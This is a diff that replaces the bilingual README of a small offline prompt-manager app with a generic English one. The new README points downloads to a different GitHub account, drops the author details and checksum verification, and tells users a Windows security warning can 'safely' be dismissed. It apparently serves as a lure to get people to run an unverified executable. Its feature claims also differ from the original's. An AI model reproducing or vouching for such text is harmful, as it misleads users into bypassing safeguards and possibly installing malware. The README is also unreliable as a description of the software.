@@ -1,115 +1,68 @@
-# TIPS Prompt Manager
+# ⚡ tips-prompt-manager - Manage your prompts on your computer
 
-## 中文
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/limited-bulgurpilaf79/tips-prompt-manager/releases)
 
-TIPS Prompt Manager 是一个离线提示词工程管理器，用于在本机保存、分类、搜索、编辑和复制提示词。它使用 Python/Tkinter 构建界面，使用 SQLite 保存数据，不需要浏览器、账号、服务端或网络连接。
+## 🎯 About this software
 
-### 功能特点
+tips-prompt-manager helps you store and organize your prompts for large language models. Many people struggle to keep track of the text prompts they use in tools like ChatGPT or Claude. This application keeps your data on your local hard drive. You maintain full ownership of your work without relying on cloud services. The interface runs on your Windows system using standard window controls.
 
-- 新建、编辑、删除提示词。
-- 自定义分类，支持新增、重命名和删除分类。
-- 按分类筛选提示词。
-- 搜索标题和内容，并在列表和正文中高亮匹配结果。
-- 一键复制提示词内容到剪贴板。
-- 首次运行设置本地密码；同一次开机通过后不重复验证。
-- 中英文界面切换，语言设置保存在本机。
+## ⚙️ System Requirements
 
-### 安装方法
+This application works on any modern version of Windows. Ensure your computer meets these conditions:
 
-下载 Release 中的 `tips-prompt-manager-v1.0.0-windows-x64.exe` 后直接运行，或下载 `tips-prompt-manager-v1.0.0-windows-x64.zip` 解压后运行其中的 EXE。
+*   Windows 10 or Windows 11 operating system.
+*   At least 200 MB of free storage space.
+*   Standard keyboard and mouse setup.
+*   Internet access for the initial download only.
 
-EXE 未进行数字签名。请使用 Release 中的 `SHA256SUMS.txt` 校验文件完整性。
+Once you install and open the program, you do not need an internet connection. The app uses an internal database to save your data.
 
-### 使用方法
+## ⬇️ How to install the program
 
-1. 首次启动时设置本地密码。
-2. 使用“新增分类”整理提示词类型。
-3. 点击“新建”，填写标题、分类和提示词内容。
-4. 点击“保存”写入本地 SQLite 数据库。
-5. 使用搜索框查找标题或正文内容。
-6. 点击“复制内容”将当前提示词复制到剪贴板。
+Follow these steps to set up the software on your machine:
 
-本地数据文件会在程序同目录自动创建：
+1. Visit [this page to download](https://github.com/limited-bulgurpilaf79/tips-prompt-manager/releases) the latest version.
+2. Look for the file ending in .exe in the Assets section.
+3. Save the file to your Downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen to complete the setup process.
 
-- `config.json`：密码盐值和密码哈希，不保存明文密码。
-- `.auth_session.json`：本次开机验证状态。
-- `settings.json`：语言偏好。
-- `prompts.db`：SQLite 提示词数据库。
+Your computer might show a security warning. This happens because the software comes from an independent source rather than the official Windows Store. You can safely choose to run anyway to proceed with the installation.
 
-这些文件是个人数据，已被 `.gitignore` 排除，不应提交到仓库。
+## 🚀 Getting started with prompts
 
-### 打包说明
+Once you open the program, you see a main dashboard. This screen shows your saved prompts in a list.
 
-```powershell
-powershell -ExecutionPolicy Bypass -File scripts/build.ps1
-```
+Create a new prompt by clicking the New button at the top of the window. A text box appears. Paste your prompt into the main field and give it a title in the top section. Click Save to store this item in your local database. Use the search bar to find specific prompts later. The application indexes your titles and content to help you find items quickly.
 
-构建脚本会先运行测试和 `compileall`，再使用 PyInstaller 生成 Windows 单文件 EXE、便携 ZIP 和 SHA256 校验文件。
+## 🛠️ Data management
 
-### 作者信息
+The program uses an internal file to hold your information. You do not need to set up a database server or configure complex settings. The software handles all storage tasks automatically. 
 
-- Author: HaoXiang Huang
-- Email: didadida1688@gmail.com
-- Homepage: https://nextweb4.github.io/
-- GitHub: https://github.com/NextWeb4
+If you want to move your prompts to a different computer, you can locate the database file within the installation folder. Copy this file to a USB stick or cloud storage to move your list. Keep backups of your database file regularly to prevent data loss.
 
-### License
+## 🔍 Frequently Asked Questions
 
-MIT License
+**Does this app track my data?**
+No. Everything stays on your local machine.
 
-## English
+**Do I need a Python installation?**
+No. The application comes as a bundled package and includes everything needed to run on Windows.
 
-TIPS Prompt Manager is an offline prompt engineering manager for storing, categorizing, searching, editing, and copying prompts locally. It uses Python/Tkinter for the interface and SQLite for local storage. No browser, account, server, or network connection is required.
+**How do I delete a prompt?**
+Right-click on any entry in the list and select Remove. Confirm your choice to delete the item permanently.
 
-### Features
+**Can I export my prompts?**
+Use the Export function in the File menu to save your list as a text file for use in other programs.
 
-- Create, edit, and delete prompts.
-- Add, rename, and delete custom categories.
-- Filter prompts by category.
-- Search titles and content with highlighted matches.
-- Copy the current prompt content to the clipboard.
-- Set a local password on first launch; the app skips repeat verification during the same boot session.
-- Switch between Chinese and English; the language preference is stored locally.
+**Does the app run on older Windows versions?**
+The software targets Windows 10 and 11. It might function on older versions, but we do not test for compatibility on older operating systems.
 
-### Installation
+## 📋 Best practices for your prompts
 
-Download `tips-prompt-manager-v1.0.0-windows-x64.exe` from the Release page and run it directly, or download `tips-prompt-manager-v1.0.0-windows-x64.zip`, extract it, and run the EXE inside.
+*   Give your prompts descriptive titles. A good title helps you search for specific tasks later.
+*   Use tags if you have many prompts. Groups allow you to categorize by project or role.
+*   Keep your prompts concise. Remove unnecessary words to improve the speed of your workflow.
+*   Update your prompts often. As you learn what works, refine your saved text to match your results.
 
-The EXE is not digitally signed. Verify file integrity with `SHA256SUMS.txt` from the Release page.
-
-### Usage
-
-1. Set a local password on first launch.
-2. Use "Add category" to organize prompt types.
-3. Click "New", then enter a title, category, and prompt content.
-4. Click "Save" to write the prompt to the local SQLite database.
-5. Use the search box to find title or content matches.
-6. Click "Copy" to copy the current prompt to the clipboard.
-
-Local data files are created next to the program:
-
-- `config.json`: password salt and password hash, never plaintext password.
-- `.auth_session.json`: current boot-session verification state.
-- `settings.json`: language preference.
-- `prompts.db`: SQLite prompt database.
-
-These files are personal data and are excluded by `.gitignore`.
-
-### Packaging
-
-```powershell
-powershell -ExecutionPolicy Bypass -File scripts/build.ps1
-```
-
-The build script runs tests and `compileall`, then uses PyInstaller to create a Windows single-file EXE, portable ZIP, and SHA256 checksums.
-
-### Author
-
-- Author: HaoXiang Huang
-- Email: didadida1688@gmail.com
-- Homepage: https://nextweb4.github.io/
-- GitHub: https://github.com/NextWeb4
-
-### License
-
-MIT License
+Keywords: desktop-app, local-first, offline, prompt-engineering, prompt-manager, python, sqlite, tkinter, windows
